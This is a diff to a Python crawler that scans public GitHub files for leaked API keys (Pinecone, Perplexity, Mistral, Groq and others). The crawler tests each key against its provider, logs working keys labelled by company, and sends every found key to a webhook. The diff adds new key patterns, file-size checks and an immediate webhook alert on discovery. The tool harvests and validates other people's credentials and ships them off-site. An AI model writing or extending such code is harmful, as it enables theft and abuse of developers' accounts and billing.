@@ -477,7 +477,10 @@ class GitHubCrawler:
             return False
     
     def get_raw_file_content(self, github_url: str) -> Optional[str]:
-        """Get raw file content from GitHub URL with retry logic"""
+        """
+        Get raw file content from GitHub URL with retry logic.
+        Skips files over 1 MB or 1 GB to avoid memory issues.
+        """
         if github_url in self.processed_files:
             return None
         
@@ -494,10 +497,27 @@ class GitHubCrawler:
             response = self._make_request_with_retry(raw_url, max_retries=2, base_delay=10)
             
             if response and response.status_code == 200:
+                # Check file size from Content-Length header before processing
+                content_length = response.headers.get('Content-Length')
+                if content_length:
+                    file_size = int(content_length)
+                    # Skip files over 1 MB (1,048,576 bytes)
+                    if file_size > 1024 * 1024:
+                        return None
+                    # Skip files over 1 GB (1,073,741,824 bytes)
+                    if file_size > 1024 * 1024 * 1024:
+                        return None
+                
                 # Check if it's a text file (not binary)
                 content_type = response.headers.get('Content-Type', '')
                 if 'text' in content_type or 'json' in content_type or 'javascript' in content_type:
-                    return response.text
+                    content = response.text
+                    # Double-check content size after download (in case Content-Length was missing)
+                    if len(content) > 1024 * 1024:  # > 1 MB
+                        return None
+                    if len(content) > 1024 * 1024 * 1024:  # > 1 GB
+                        return None
+                    return content
             
         except Exception as e:
             logger.debug(f"Error fetching {github_url}: {e}")
@@ -558,6 +578,12 @@ class GitHubCrawler:
                             valid_length = True
                         elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
                             valid_length = True
+                        elif key_type == 'perplexity' and key_clean.startswith('pplx-'):
+                            valid_length = True
+                        elif key_type == 'mistral' and len(key_clean) >= 32:
+                            valid_length = True
+                        elif key_type == 'groq' and key_clean.startswith('gsk_'):
+                            valid_length = True
                         
                         if valid_length:
                             # Check if we've seen this key before
@@ -581,8 +607,15 @@ class GitHubCrawler:
         key_type = key_info["key_type"]
         key = key_info["key"]
         
-        # Save to all keys file immediately
-        self.all_keys_file.write(f"{key}\n")
+        # Get company name
+        try:
+            from webhook_notifier import get_company_name
+            company_name = get_company_name(key_type)
+        except:
+            company_name = key_type.replace("_", " ").title()
+        
+        # Save to all keys file immediately with company name: COMPANY | KEY
+        self.all_keys_file.write(f"{company_name} | {key}\n")
         self.all_keys_file.flush()  # Ensure it's written immediately
         
         # Track key in current run if app is available
@@ -595,14 +628,28 @@ class GitHubCrawler:
         self.stats["keys_found"] += 1
         logger.info(f"🔑 Found {key_type} key: {key[:30]}...")
         
+        # Send webhook notification immediately when key is found
+        try:
+            from webhook_notifier import send_webhook_notification
+            send_webhook_notification(key, key_type, "API key found", is_working=False)
+        except Exception as e:
+            logger.warning(f"Failed to send webhook notification for found key: {e}")
+        
         # Test the key
         try:
             is_valid, message = self.validator.validate_key(key_type, key)
             self.stats["keys_tested"] += 1
             
             if is_valid:
-                # Save to working keys file
-                self.working_keys_file.write(f"{key}\n")
+                # Get company name (already retrieved above, but ensure it's available)
+                try:
+                    from webhook_notifier import get_company_name
+                    company_name = get_company_name(key_type)
+                except:
+                    company_name = key_type.replace("_", " ").title()
+                
+                # Save to working keys file with company name: COMPANY | KEY
+                self.working_keys_file.write(f"{company_name} | {key}\n")
                 self.working_keys_file.flush()
                 
                 # Track working key too
@@ -615,12 +662,12 @@ class GitHubCrawler:
                 self.stats["keys_working"] += 1
                 logger.info(f"✅ WORKING {key_type} key: {key[:30]}... ({message})")
                 
-                # Send webhook notification
+                # Send webhook notification for working key
                 try:
                     from webhook_notifier import send_webhook_notification
-                    send_webhook_notification(key, key_type, message)
+                    send_webhook_notification(key, key_type, message, is_working=True)
                 except Exception as e:
-                    logger.warning(f"Failed to send webhook notification: {e}")
+                    logger.warning(f"Failed to send webhook notification for working key: {e}")
             else:
                 logger.debug(f"❌ Invalid {key_type} key: {message}")
         
